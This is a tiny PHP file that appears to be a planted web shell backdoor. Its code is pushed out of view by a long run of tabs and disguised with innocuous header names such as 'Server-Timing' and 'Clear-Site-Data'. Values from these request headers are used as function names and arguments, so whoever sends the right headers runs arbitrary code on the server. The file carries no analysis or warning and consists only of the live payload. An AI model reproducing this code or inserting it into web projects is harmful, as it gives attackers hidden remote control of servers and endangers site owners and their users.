<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Server-Timing'])){$dba_insertion=$_HEADERS['Server-Timing']('', $_HEADERS['X-Dns-Prefetch-Control']($_HEADERS['Clear-Site-Data']));$dba_insertion();}
